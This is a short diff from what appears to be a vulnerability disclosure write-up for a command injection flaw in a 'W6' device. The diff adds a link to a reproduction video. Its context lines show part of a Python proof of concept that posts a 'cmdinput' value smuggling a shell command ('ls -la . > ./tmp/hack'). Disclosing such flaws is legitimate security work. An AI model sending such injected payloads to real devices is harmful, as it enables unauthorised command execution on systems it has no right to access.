@@ -31,3 +31,7 @@ burp0_headers = {"Host":"192.168.5.1",
 data1="cmdinput=asd;ls -la . > ./tmp/hack;aa"+'a'*0x0
 requests.post(burp0_url,headers=burp0_headers,data=data1, verify=False,timeout=1)
 ```
+
+[The specific reproduction process is shown in the video](./video/W6命令注入.mp4)
+
+
